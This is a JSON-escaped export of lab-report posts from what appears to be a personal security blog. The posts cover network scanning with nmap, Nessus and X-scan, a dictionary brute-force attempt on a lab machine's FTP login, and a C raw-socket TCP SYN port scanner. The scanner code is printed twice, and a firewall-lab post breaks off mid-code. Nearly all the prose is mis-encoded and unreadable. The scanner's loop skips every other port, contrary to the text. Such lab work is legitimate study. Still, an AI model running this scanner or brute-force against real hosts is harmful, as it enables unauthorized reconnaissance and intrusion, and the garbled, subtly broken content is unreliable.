é€šè¿‡å°†è¯·æ±‚åŒ…ç½®ä¸ºFINæŸ¥çœ‹ç«¯å£æ˜¯å¦å¼€æ”¾ã€‚ nmapæŠ¥å‘Š\nnessus å› ä¸ºWindow xpé‡Œé¢çš„ nessusç‰ˆæœ¬ç”¨ä¸äº†\næ‰€ä»¥åœ¨è™šæ‹ŸæœºWindows 7 é‡Œé¢æ­å»ºæ–°ç‰ˆçš„ Nessus 8\nå¹¶ä¸”å¯¹é¶æœº192.168.195.135è¿›è¡Œæ”»å‡»\nåˆ©ç”¨Wiresharkè¿›è¡ŒæŠ“åŒ…åˆ†ææ•°æ®æµã€‚\nTCP-SYNæ‰«æ\nè¿™é‡Œä»…ä»¥HTTPä¸ºä¾‹å­ã€‚(å…¶ä»–çš„åè®®å°±ä¸èµ˜è¿°äº†)\n80ç«¯å£å¼€æ”¾ï¼Œæ‰€ä»¥SYNè¯·æ±‚ä¹‹åï¼Œå¯ä»¥æ­£å¸¸å›æ˜¾ï¼Œåä¹‹ï¼Œå¦‚æœè¯·æ±‚çš„ç«¯å£81.82æ²¡æœ‰å¼€æ”¾ï¼Œåˆ™å›æ˜¾ä¸€ä¸ªRSTåŒ…\nTCP - Connect æ‰«æ\nå¯ä»¥çœ‹åˆ° äº¤äº’è¿‡ç¨‹å…ˆ å®ç°ä¸‰æ¬¡æ¡æ‰‹ã€‚æŸ¥çœ‹äº†HTTPSã€HTTPã€TLSV1ã€sshã€FTPåè®® SSLV2 åè®®æ˜¯å¦æ”¯æŒ\nSSLv3 åè®®æ˜¯å¦æ”¯æŒ\nnessus æ‰«æ192.168.195.135 å¾—åˆ°çš„æ¼æ´æŠ¥å‘Š\n0x05 æ‰¾åˆ°æ¼æ´ FTPå¼±å£ä»¤æ¼æ´æ‰«æï¼š æ‰«æåŸç†ï¼š åœ¨ä¸Šè¿°å®éªŒè¿‡ç¨‹ä¸­ï¼Œå‘ç°é¶æœºå¼€å¯äº†21(é»˜è®¤ç«¯å£)ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç”¨å­—å…¸é‡Œçš„è´¦æˆ·å’Œå¯†ç å»è¯•ç€ç™»å½•ï¼Œå¦‚æœèƒ½å¤Ÿç™»é™†ä¸Šå»ï¼Œåˆ™å­˜åœ¨æ¼æ´ åˆ©ç”¨S-scanè¿›è¡Œæ‰«ææ¨¡å— é€‰æ‹©æ‰«ææ¨¡å—ï¼Œæ‰«æç«¯å£ æ‰«æç»“æŸ ç”Ÿæˆçš„æŠ¥å‘Š ç”¨Wireshark å¯¹è¿‡ç¨‹è¿›è¡Œåˆ†æ é¦–å…ˆï¼Œæ”»å‡»æœºåˆ©ç”¨éšæœºç«¯å£å‘é¶æœºçš„FTPç«¯å£å‘å‡ºTCP SYNè¿æ¥è¯·æ±‚ ç„¶åï¼Œé¶æœºç«¯ç»™å…¶å›å¤ä¸€ä¸ªACK,æ­¤æ—¶å¯ä»¥ç›‘å¬åˆ°21ç«¯å£ æœ€åï¼Œæ”»å‡»æœºæ”¶åˆ°é¶æœºçš„ackï¼Œå†å›å¤ä¸€ä¸ªack,è‡³æ­¤ä¸‰æ¬¡æ¡æ‰‹å®Œæˆ ä¹‹åï¼Œæ”»å‡»æœºå°±å¼€å§‹ç”¨å­—å…¸é‡Œé¢çš„æ•°æ®æ¥ ä¸æ–­å‘é€æ•°æ®åŒ…æ¥æš´åŠ›ç ´è§£ é¶æœºçš„FTPæœåŠ¡å™¨å¯†ç è´¦æˆ· ä¹‹åçš„è¿‡ç¨‹ï¼Œæ”»å‡»æœºä¸€ç›´å†é‡å¤ä»¥ä¸Šè¿‡ç¨‹ï¼Œä½†å¯èƒ½å› ä¸ºFTPè´¦æˆ·å’Œå¯†ç è®¾ç½®çš„è¾ƒä¸ºå¤æ‚ï¼Œä»¥åŠæ”»å‡»æœºçš„å­—å…¸è¿‡äºå¼±å°ï¼Œæ‰€ä»¥ä¸èƒ½å¤Ÿæš´åŠ›ç™»å…¥ftpæœåŠ¡å™¨ä¸­ 0x06 ç¼–ç¨‹å®ç° è¿™é‡Œå®ç°çš„æ˜¯TCP SYN æ‰«æ(å³åŠè¿æ¥æ‰«æ)\nè¿™é‡Œç”¨å¥—æ¥å­—socketçš„æ–¹æ³•æ¥å®ç°tcp SYN æ‰«æ\næ¥å®ç°æŸ¥çœ‹é¶æœºç«¯å£çš„å¼€æ”¾æƒ…å†µï¼Œä¾¿äºæ–¹ä¾¿ï¼Œè¿™é‡Œç«¯å£å³ä»1~1024ä¸ºæ­¢ã€‚ åªéœ€è¦æ„é€ å¥½ä¸€ä¸ªTCPåŒ…ï¼ŒæŒ‡å®šå¥½åŒ…ä¸­IP.flags=0x02(ä¸ºSYNåŒ…)ã€‚\næˆ‘ä»¬è¿™é‡Œåœ¨ubuntu 16 çš„ç¯å¢ƒä¸­ç¼–è¯‘æˆ‘ä»¬å†™å¥½çš„ç¨‹åº\næ‰§è¡Œç¨‹åº\nä¸æ­¤åŒæ—¶ï¼Œåˆ©ç”¨Wiresharkåœ¨é¶æœºè¿›è¡ŒæŠ“åŒ…\nå¯ä»¥å¾ˆæ˜æ˜¾çš„çœ‹åˆ°æ”»å‡»æœºçš„éšæœºç«¯å£å‘é¶æœºçš„ç«¯å£ä»1-1024å‘é€SYNè¯·æ±‚ï¼Œç«¯å£å­˜åœ¨è¿”å›ACKåŒ…ï¼Œç«¯å£ä¸å­˜åœ¨è¿”å›RSTåŒ…ã€‚ æºç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;ctype.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;signal.h\u0026gt; #include \u0026lt;sys/time.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;sys/socket.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;netdb.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;time.h\u0026gt; #include \u0026lt;arpa/inet.h\u0026gt; struct iphdr { unsigned char ver_and_hdrlen;// ç‰ˆæœ¬å·ä¸IPå¤´éƒ¨é•¿åº¦ unsigned char tos; // æœåŠ¡ç±»å‹ unsigned short total_len; // æ€»é•¿åº¦ unsigned short id; // IPåŒ…ID unsigned short flags; // æ ‡å¿—ä½(åŒ…æ‹¬åˆ†ç‰‡åç§»é‡) unsigned char ttl; // ç”Ÿå‘½å‘¨æœŸ unsigned char protocol; // ä¸Šå±‚åè®® unsigned short checksum; // æ ¡éªŒå’Œ unsigned int srcaddr; // æºIPåœ°å€ unsigned int dstaddr; // ç›®æ ‡IPåœ°å€ }; struct tcphdr { unsigned short sport; // æºç«¯å£ unsigned short dport; // ç›®æ ‡ç«¯å£ unsigned int seq; // åºåˆ—å· unsigned int ack_seq; // ç¡®è®¤å· unsigned char len; // é¦–éƒ¨é•¿åº¦ unsigned char flag; // æ ‡å¿—ä½ unsigned short win; // çª—å£å¤§å° unsigned short checksum; // æ ¡éªŒå’Œ unsigned short urg; // ç´§æ€¥æŒ‡é’ˆ }; struct pseudohdr { unsigned int saddr; unsigned int daddr; char zeros; char protocol; unsigned short length; }; unsigned short inline checksum(unsigned short *buffer, unsigned short size) { unsigned long cksum = 0; while (size \u0026gt; 1) { cksum += *buffer++; size -= sizeof(unsigned short); } if (size) { cksum += *(unsigned char *)buffer; } cksum = (cksum \u0026gt;\u0026gt; 16) + (cksum \u0026amp; 0xffff); cksum += (cksum \u0026gt;\u0026gt; 16); return (unsigned short )(~cksum); } void init_ip_header(struct iphdr *ip, unsigned int srcaddr, unsigned int dstaddr) { int len = sizeof(struct iphdr) + sizeof(struct tcphdr); ip-\u0026gt;ver_and_hdrlen = (4\u0026lt;\u0026lt;4 | sizeof(struct iphdr)/sizeof(unsigned int)); ip-\u0026gt;tos = 0; ip-\u0026gt;total_len = htons(len); ip-\u0026gt;id = 1; ip-\u0026gt;flags = 0x40; ip-\u0026gt;ttl = 255; ip-\u0026gt;protocol = IPPROTO_TCP; ip-\u0026gt;checksum = 0; ip-\u0026gt;srcaddr = srcaddr; // æºIPåœ°å€ ip-\u0026gt;dstaddr = dstaddr; // ç›®æ ‡IPåœ°å€ } void init_tcp_header(struct tcphdr *tcp, unsigned short dport) { tcp-\u0026gt;sport = htons(rand() % 16383 + 49152); // éšæœºç”Ÿæˆä¸€ä¸ªç«¯å£ tcp-\u0026gt;dport = htons(dport); // ç›®æ ‡ç«¯å£ tcp-\u0026gt;seq = htonl(rand() % 90000000 + 2345 ); // éšæœºç”Ÿæˆä¸€ä¸ªåˆå§‹åŒ–åºåˆ—å· tcp-\u0026gt;ack_seq = 0; tcp-\u0026gt;len = (sizeof(struct tcphdr) / 4 \u0026lt;\u0026lt; 4 | 0); tcp-\u0026gt;flag = 0x02; tcp-\u0026gt;win = htons(1024); tcp-\u0026gt;checksum = 0; tcp-\u0026gt;urg = 0; } void init_pseudo_header(struct pseudohdr *pseudo, unsigned int srcaddr, unsigned int dstaddr) { pseudo-\u0026gt;zeros = 0; pseudo-\u0026gt;protocol = IPPROTO_TCP; pseudo-\u0026gt;length = htons(sizeof(struct tcphdr)); pseudo-\u0026gt;saddr = srcaddr; pseudo-\u0026gt;daddr = dstaddr; } int make_syn_packet(char *packet, int pkt_len, unsigned int daddr,unsigned int saddr, unsigned short dport) { char buf[100]; int len; struct iphdr ip; //IP å¤´éƒ¨ struct tcphdr tcp; //TCP å¤´éƒ¨ struct pseudohdr pseudo; //TCP ä¼ªå¤´éƒ¨ //saddr = inet_addr(\u0026#34;192.168.195.145\u0026#34;); len = sizeof(ip) + sizeof(tcp); // åˆå§‹åŒ–å¤´éƒ¨ä¿¡æ¯ init_ip_header(\u0026amp;ip, saddr, daddr); init_tcp_header(\u0026amp;tcp, dport); init_pseudo_header(\u0026amp;pseudo, saddr, daddr); //è®¡ç®—IPæ ¡éªŒå’Œ ip.checksum = checksum((u_short *)\u0026amp;ip, sizeof(ip)); // è®¡ç®—TCPæ ¡éªŒå’Œ bzero(buf, sizeof(buf)); memcpy(buf , \u0026amp;pseudo, sizeof(pseudo)); // å¤åˆ¶TCPä¼ªå¤´éƒ¨ memcpy(buf + sizeof(pseudo), \u0026amp;tcp, sizeof(tcp)); // å¤åˆ¶TCPå¤´éƒ¨ tcp.checksum = checksum((u_short *)buf, sizeof(pseudo) + sizeof(tcp)); bzero(packet, pkt_len); memcpy(packet, \u0026amp;ip, sizeof(ip)); memcpy(packet + sizeof(ip), \u0026amp;tcp, sizeof(tcp)); return len; } int make_raw_socket() { int fd; int on = 1; // åˆ›å»ºä¸€ä¸ªåŸå§‹å¥—æ¥å­—, æŒ‡å®šå…¶å…³æ³¨TCPåè®® fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); if (fd == -1) { return -1; } // è®¾ç½®éœ€è¦æ‰‹åŠ¨æ„å»ºIPå¤´éƒ¨ if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, (char *)\u0026amp;on, sizeof(on)) \u0026lt; 0) { close(fd); return -1; } return fd; } int send_syn_packet(int i ,int sockfd, unsigned int addr, unsigned int sddr,unsigned short port) { struct sockaddr_in skaddr; char packet[256]; int pkt_len; bzero(\u0026amp;skaddr, sizeof(skaddr)); skaddr.sin_family = AF_INET; skaddr.sin_port = htons(port); skaddr.sin_addr.s_addr = addr; printf(\u0026#34;%d ç«¯å£å·²ç»æ¢æµ‹\\n\u0026#34;,i); pkt_len = make_syn_packet(packet, 256, addr,sddr, port); return sendto(sockfd, packet, pkt_len, 0, (struct sockaddr *)\u0026amp;skaddr, sizeof(struct sockaddr)); } int main(int argc, char *argv[]) { unsigned int addr; unsigned int sddr; unsigned short port; int sockfd; if (argc \u0026lt; 3) { fprintf(stderr, \u0026#34;Usage: synflood \u0026lt;address\u0026gt; \u0026lt;port\u0026gt;\\n\u0026#34;); exit(1); } addr = inet_addr(argv[1]); sddr = inet_addr(argv[2]); sockfd = make_raw_socket(); if (sockfd == -1) { fprintf(stderr, \u0026#34;Failed to make raw socket\\n\u0026#34;); exit(1); } for (int i = 0 ; i \u0026lt;= 1024; i++) { port = i; if (send_syn_packet(i,sockfd, addr,sddr, port) \u0026lt; 0) { fprintf(stderr, \u0026#34;Failed to send syn packet\\n\u0026#34;); } i +=1; } close(sockfd); return 0; } 0x07 æ€»ç»“ æ˜æ™“ç½‘ç»œæ‰«æå™¨xscanã€nmapã€nessusç½‘ç»œæ‰«æè¿‡ç¨‹ä¸­ç”¨åˆ°çš„æ‰«ææ–¹æ³•ã€‚ ç½‘ç»œæ‰«æä¸‰ä¸ªè¿‡ç¨‹ ä¸»æœºæ‰«æ ç«¯å£æ‰«æ æ¼æ´åˆ†æ æ˜ç™½äº†TCP SYNã€ACKã€FINã€NULLã€Xmacã€Connect ç­‰æ‰«ææ–¹æ³•çš„åŸç†ã€‚ é€šè¿‡Xscanæ‰«æé¶æœºçš„FTP,é€šè¿‡WiresharkæŠ“åŒ…åˆ†ææ‰«æå™¨åˆ©ç”¨FTPå¼±å£ä»¤æ¼æ´çš„è¿‡ç¨‹ã€‚ é€šè¿‡ç¼–ç¨‹socket å®ç° TCP SYN æ‰«æï¼Œè¿›ä¸€æ­¥åŠ æ·±äº†å¯¹socketç¼–ç¨‹çš„ç†è§£ã€‚ ","permalink":"http://www.reus09.top/posts/tech/%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F/","summary":"ç½‘ç»œæ‰«æ 0x01 å®éªŒç›®çš„ ç”¨xscanã€nmapå’Œnessusè½¯ä»¶è¿›è¡Œä¸»æœºã€ç«¯å£ã€æ¼æ´æ‰«æå®éªŒï¼Œæ•è·æ‰«ææ—¶äº¤äº’çš„æ•°æ®åŒ…ï¼Œé€šè¿‡åˆ†ææ‰«ææ•°æ®åŒ…ï¼ŒéªŒè¯æ‰«æ","title":"ç½‘ç»œæ‰«æ"},{"content":"é˜²ç«å¢™å®éªŒ 0x01 å®éªŒç›®æ ‡ é€‰æ‹©ä¸€ç§ä¸»æµçš„è½¯ä»¶é˜²ç«å¢™ï¼Œç†Ÿæ‚‰å…¶å®‰å…¨è§„åˆ™é…ç½®ï¼Œé€šè¿‡é…ç½®é˜²ç«å¢™è§„åˆ™ï¼Œå®ç°ä»¥ä¸‹åŠŸèƒ½ï¼š\nè¿‡æ»¤è¿œç¨‹æœåŠ¡å™¨ï¼ˆRï¼‰åˆ°æœ¬åœ°ä¸»æœºï¼ˆLï¼‰çš„TCPæ•°æ®ã€‚ è¿‡æ»¤R-\u0026gt;Lä¸­æ•°æ®åŒ…æºç«¯å£ä¸º21æˆ–80çš„æ•°æ®ï¼ŒæŸ¥çœ‹ç°è±¡ã€‚ èƒ½å¤Ÿç”±æœ¬æœºç™»å½•ftpæœåŠ¡å™¨æˆåŠŸï¼ˆé€šè¿‡ç”¨æˆ·åã€å¯†ç éªŒè¯ï¼‰ é˜»æ­¢å°†ftpå†…å®¹åˆ—è¡¨ã€ä¸Šä¼ ã€ä¸‹è½½æ•°æ®ã€‚ é…ç½®linuxç³»ç»Ÿä¸‹iptablesé˜²ç«å¢™ï¼›åœ¨linuxç³»ç»Ÿä¸‹ï¼Œé…ç½®iptablesé˜²ç«å¢™ï¼Œå®ç°å¦‚ä¸‹åŠŸèƒ½ï¼š\nIptablesé˜²ç«å¢™çš„å¯åŠ¨åœæ­¢ã€‚ Iptablesé˜²ç«å¢™è§„åˆ™æŸ¥çœ‹ã€æ·»åŠ ã€åˆ é™¤ã€‚ è®¾ç½®Iptablesé˜²ç«å¢™çš„åŒ…è¿‡æ»¤è§„åˆ™ï¼Œå®ç°ä»¥ä¸‹åŠŸèƒ½ï¼š ç¦æ­¢æ‰€æœ‰è¿›å‡ºæœ¬åœ°ä¸»æœºçš„æ•°æ®åŒ…é€šè¿‡ï¼›ï¼ˆé€šè¿‡PingéªŒè¯ï¼‰ å…è®¸æŸç‰¹å®šIPä¸»æœºè¿œç¨‹pingæœ¬åœ°ä¸»æœºï¼› å…è®¸æŸç‰¹å®šIPä¸»æœºè¿œç¨‹telnetæˆ–puttyæœ¬åœ°ä¸»æœºã€‚ é€‰åšï¼šå®Œæˆä¸‹è¿°åŠŸèƒ½ï¼š\nç”±æœ¬æœºç™»å½•ftpæœåŠ¡å™¨æˆåŠŸï¼ˆé€šè¿‡ç”¨æˆ·åã€å¯†ç éªŒè¯ï¼‰ï¼› æ— æ³•å°†ftpå†…å®¹åˆ—è¡¨æˆ–ä¸Šä¼ ã€ä¸‹è½½æ•°æ®ï¼› 0x02 å®éªŒå‰æ å®éªŒå‰æçŸ¥è¯†\né˜²ç«å¢™å®šä¹‰ï¼š\né˜²ç«å¢™æ˜¯ä½äºä¸¤ä¸ªï¼ˆæˆ–å¤šä¸ªï¼‰ç½‘ç»œé—´ï¼Œå®æ–½ç½‘é—´è®¿é—®æ§åˆ¶çš„ä¸€ç»„ç»„ä»¶çš„é›†åˆã€‚ é˜²ç«å¢™æ˜¯æŒ‡éš”ç¦»åœ¨å†…éƒ¨ç½‘ç»œå’Œå¤–éƒ¨ç½‘ç»œä¹‹é—´çš„ä¸€é“é˜²å¾¡ç³»ç»Ÿï¼Œæ˜¯è¿™ä¸€ç±»é˜²èŒƒæªæ–½çš„æ€»ç§°ã€‚ é˜²ç«å¢™è®¾è®¡ç›®æ ‡ï¼š\nå†…éƒ¨å’Œå¤–éƒ¨ä¹‹é—´çš„æ‰€æœ‰ç½‘ç»œæ•°æ®æµå¿…é¡»ç»è¿‡é˜²ç«å¢™ã€‚ åªæœ‰ç¬¦åˆå®‰å…¨ç­–ç•¥çš„æ•°æ®æµï¼Œå³ï¼Œç»è¿‡æˆæƒçš„æ•°æ®æµæ‰èƒ½é€šè¿‡é˜²ç«å¢™ã€‚ é˜²ç«å¢™è‡ªèº«ä¸èƒ½è¢«æ”»ç ´ã€‚ é˜²ç«å¢™ç»å…¸éƒ¨ç½²\né˜²ç«å¢™åŠŸèƒ½æ¨¡å—\né˜²ç«å¢™ç±»å‹\nåŒ…è¿‡æ»¤é˜²ç«å¢™ åŒ…è¿‡æ»¤é˜²ç«å¢™ç”¨è§„åˆ™æ£€æµ‹æ¯ä¸ªIPåŒ…ï¼Œæ ¹æ®ç»“æœæ”¾è¡Œæˆ–ä¸¢å¼ƒè¿™äº›æ•°æ®åŒ…ã€‚ åŒ…è¿‡æ»¤é˜²ç«å¢™ä¸€èˆ¬ä¼šé…ç½®ä¸ºåŒå‘è¿‡æ»¤ï¼Œå³é’ˆå¯¹è¿›å…¥å†…éƒ¨ç½‘ç»œå’Œç¦»å¼€å†…éƒ¨ç½‘ç»œä¸¤ä¸ªæ–¹å‘çš„æ•°æ®è¿›è¡Œè¿‡æ»¤ã€‚ è¿‡æ»¤è§„åˆ™åŸºäºæ•°æ®åŒ…ä¸­çš„ä¿¡æ¯ï¼Œä¾‹å¦‚ï¼š æºã€ç›®IPåœ°å€ï¼Œ æºã€ç›®ç«¯å£ï¼Œä¾‹å¦‚ï¼šFTP(21)ã€ HTTP(80) ã€DNS(53)â€¦ åè®®ç±»å‹ï¼Œä¾‹å¦‚ï¼šTCPã€ UDPã€ ICMP ã€IGMPâ€¦ çŠ¶æ€æ£€æŸ¥é˜²ç«å¢™ è¿‡æ»¤è§„åˆ™åŸºäºæ•°æ®åŒ…ä¸­çš„ä¿¡æ¯ï¼Œä¾‹å¦‚ï¼š ç½‘ç»œæ¥å£ï¼Œä¾‹å¦‚ï¼šeth0ç”¨äºå…¥ç«™ï¼Œeth1ç”¨äºå‡ºç«™â€¦ IPé€‰é¡¹ï¼Œä¾‹å¦‚ï¼šæºè·¯ç”±ã€è®°å½•è·¯ç”±â€¦ TCPé€‰é¡¹ï¼Œä¾‹å¦‚ï¼šSYN ã€ACKã€ FIN ã€RSTâ€¦ æ•°æ®åŒ…æµå‘ï¼Œä¾‹å¦‚ï¼šå…¥ç«™ï¼ˆinï¼‰æˆ–å‡ºç«™ï¼ˆoutï¼‰ ç”µè·¯çº§ä»£ç†é˜²ç«å¢™ æ˜¯ä¸€ä¸ªé€šç”¨ä»£ç†æœåŠ¡å™¨ï¼Œå®ƒå·¥ä½œäºOSIäº’è”æ¨¡å‹çš„ä¼šè¯å±‚æˆ–æ˜¯TCP/IPåè®®çš„TCPå±‚ã€‚ å®ƒé€‚ç”¨äºå¤šä¸ªåè®®ï¼Œä½†å®ƒä¸èƒ½è¯†åˆ«åœ¨åŒä¸€ä¸ªåè®®æ ˆä¸Šè¿è¡Œçš„ä¸åŒçš„åº”ç”¨ï¼Œå½“ç„¶ä¹Ÿå°±ä¸éœ€è¦å¯¹ä¸åŒçš„åº”ç”¨è®¾ç½®ä¸åŒçš„ä»£ç†æ¨¡å—ï¼Œä½†è¿™ç§ä»£ç†éœ€è¦å¯¹å®¢æˆ·ç«¯ä½œé€‚å½“ä¿®æ”¹ã€‚ å®ƒæ¥å—å®¢æˆ·ç«¯çš„è¿æ¥è¯·æ±‚ï¼Œä»£ç†å®¢æˆ·ç«¯å®Œæˆç½‘ç»œè¿æ¥ï¼Œå»ºç«‹èµ·ä¸€ä¸ªå›è·¯ï¼Œå¯¹æ•°æ®åŒ…èµ·è½¬å‘ä½œç”¨ï¼Œæ•°æ®åŒ…è¢«æäº¤ç»™ç”¨æˆ·çš„åº”ç”¨å±‚æ¥å¤„ç†ã€‚ é€šè¿‡ç”µè·¯çº§ç½‘å…³ä¼ é€’çš„æ•°æ®ä¼¼ä¹èµ·æºäºé˜²ç«å¢™ï¼Œéšè—äº†è¢«ä¿æŠ¤ç½‘ç»œçš„ä¿¡æ¯ã€‚ åº”ç”¨å±‚ä»£ç†é˜²ç«å¢™ é¦–å…ˆï¼Œå®ƒå¯¹è¯¥ç”¨æˆ·çš„èº«ä»½è¿›è¡ŒéªŒè¯ã€‚ è‹¥ä¸ºåˆæ³•ç”¨æˆ·ï¼Œåˆ™æŠŠè¯·æ±‚è½¬å‘ç»™çœŸæ­£çš„æŸä¸ªå†…éƒ¨ç½‘ç»œçš„ä¸»æœºï¼ŒåŒæ—¶ç›‘æ§ç”¨æˆ·çš„æ“ä½œï¼Œæ‹’ç»ä¸åˆæ³•çš„è®¿é—®ã€‚ å½“å†…éƒ¨ç½‘ç»œå‘å¤–éƒ¨ç½‘ç»œç”³è¯·æœåŠ¡æ—¶ï¼Œä»£ç†æœåŠ¡å™¨çš„å·¥ä½œè¿‡ç¨‹åˆšå¥½ç›¸åã€‚ å®éªŒç¯å¢ƒ\nFTPæœåŠ¡å™¨ windows xp IP:192.168.195.162 FTPå®¢æˆ·ç«¯ ä»¥åŠ Windowsé˜²ç«å¢™ Windows xp IP:192.168.195.131 Linux é˜²ç«å¢™ Centos 7: 192.168.195.174 å®éªŒå·¥å…·\nå‘é€tcpåŒ…åˆ°ç›®çš„æœºéšæœºç«¯å£çš„è„šæœ¬\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;ctype.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;signal.h\u0026gt; #include \u0026lt;sys/time.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;sys/socket.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;netdb.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;time.h\u0026gt; #include \u0026lt;arpa/inet.h\u0026gt; struct iphdr { unsigned char ver_and_hdrlen;// ç‰ˆæœ¬å·ä¸IPå¤´éƒ¨é•¿åº¦ unsigned char tos; // æœåŠ¡ç±»å‹ unsigned short total_len; // æ€»é•¿åº¦ unsigned short id; // IPåŒ…ID unsigned short flags; // æ ‡å¿—ä½(åŒ…æ‹¬åˆ†ç‰‡åç§»é‡) unsigned char ttl; // ç”Ÿå‘½å‘¨æœŸ unsigned char protocol; // ä¸Šå±‚åè®® unsigned short checksum; // æ ¡éªŒå’Œ unsigned int srcaddr; // æºIPåœ°å€ unsigned int dstaddr; // ç›®æ ‡IPåœ°å€ }; struct tcphdr { unsigned short sport; // æºç«¯å£ unsigned short dport; // ç›®æ ‡ç«¯å£ unsigned int seq; // åºåˆ—å· unsigned int ack_seq; // ç¡®è®¤å· unsigned char len; // é¦–éƒ¨é•¿åº¦ unsigned char flag; // æ ‡å¿—ä½ unsigned short win; // çª—å£å¤§å° unsigned short checksum; // æ ¡éªŒå’Œ unsigned short urg; // ç´§æ€¥æŒ‡é’ˆ }; struct pseudohdr { unsigned int saddr; unsigned int daddr; char zeros; char protocol; unsigned short length; }; unsigned short inline checksum(unsigned short *buffer, unsigned short size) { unsigned long cksum = 0; while (size \u0026gt; 1) { cksum += *buffer++; size -= sizeof(unsigned short); } if (size) { cksum += *(unsigned char *)buffer; } cksum = (cksum \u0026gt;\u0026gt; 16) + (cksum \u0026amp; 0xffff); cksum += (cksum \u0026gt;\u0026gt; 16); return (unsigned short )(~cksum); } void init_ip_header(struct iphdr *ip, unsigned int srcaddr, unsigned int dstaddr) { int len = sizeof(struct iphdr) + sizeof(struct tcphdr); ip-\u0026gt;ver_and_hdrlen = (4\u0026lt;\u0026lt;4 | sizeof(struct iphdr)/sizeof(unsigned int)); ip-\u0026gt;tos = 0; ip-\u0026gt;total_len = htons(len); ip-\u0026gt;id = 1; ip-\u0026gt;flags = 0x40; ip-\u0026gt;ttl = 255; ip-\u0026gt;protocol = IPPROTO_TCP; ip-\u0026gt;checksum = 0; ip-\u0026gt;srcaddr = srcaddr; // æºIPåœ°å€ ip-\u0026gt;dstaddr = dstaddr; // ç›®æ ‡IPåœ°å€ } void init_tcp_header(struct tcphdr *tcp, unsigned short dport) { tcp-\u0026gt;sport = htons(rand() % 16383 + 49152); // éšæœºç”Ÿæˆä¸€ä¸ªç«¯å£ tcp-\u0026gt;dport = htons(dport); // ç›®æ ‡ç«¯å£ tcp-\u0026gt;seq = htonl(rand() % 90000000 + 2345 ); // éšæœºç”Ÿæˆä¸€ä¸ªåˆå§‹åŒ–åºåˆ—å· tcp-\u0026gt;ack_seq = 0; tcp-\u0026gt;len = (sizeof(struct tcphdr) / 4 \u0026lt;\u0026lt; 4 | 0); tcp-\u0026gt;flag = 0x02; tcp-\u0026gt;win = htons(1024); tcp-\u0026gt;checksum = 0; tcp-\u0026gt;urg = 0; } void init_pseudo_header(struct pseudohdr *pseudo, unsigned int srcaddr, unsigned int dstaddr) { pseudo-\u0026gt;zeros = 0; pseudo-\u0026gt;protocol = IPPROTO_TCP; pseudo-\u0026gt;length = htons(sizeof(struct tcphdr)); pseudo-\u0026gt;saddr = srcaddr; pseudo-\u0026gt;daddr = dstaddr; } int make_syn_packet(char *packet, int pkt_len, unsigned int daddr,unsigned int saddr, unsigned short dport) { char buf[100]; int len; struct iphdr ip; //IP å¤´éƒ¨ struct tcphdr tcp; //TCP å¤´éƒ¨ struct pseudohdr pseudo; //TCP ä¼ªå¤´éƒ¨ //saddr = inet_addr(\u0026#34;192.168.195.145\u0026#34;); len = sizeof(ip) + sizeof(tcp); // åˆå§‹åŒ–å¤´éƒ¨ä¿¡æ¯ init_ip_header(\u0026amp;ip, saddr, daddr); init_tcp_header(\u0026amp;tcp, dport); init_pseudo_header(\u0026amp;pseudo, saddr, daddr); //è®¡ç®—IPæ ¡éªŒå’Œ ip.checksum = checksum((u_short *)\u0026amp;ip, sizeof(ip)); // è®¡ç®—TCPæ ¡éªŒå’Œ bzero(buf, sizeof(buf)); memcpy(buf , \u0026amp;pseudo, sizeof(pseudo)); // å¤åˆ¶TCPä¼ªå¤´éƒ¨ memcpy(buf + sizeof(pseudo), \u0026amp;tcp, sizeof(tcp)); // å¤åˆ¶TCPå¤´éƒ¨ tcp.checksum = checksum((u_short *)buf, sizeof(pseudo) + sizeof(tcp)); bzero(packet, pkt_len); memcpy(packet, \u0026amp;ip, sizeof(ip)); memcpy(packet + sizeof(ip), \u0026amp;tcp, sizeof(tcp)); return 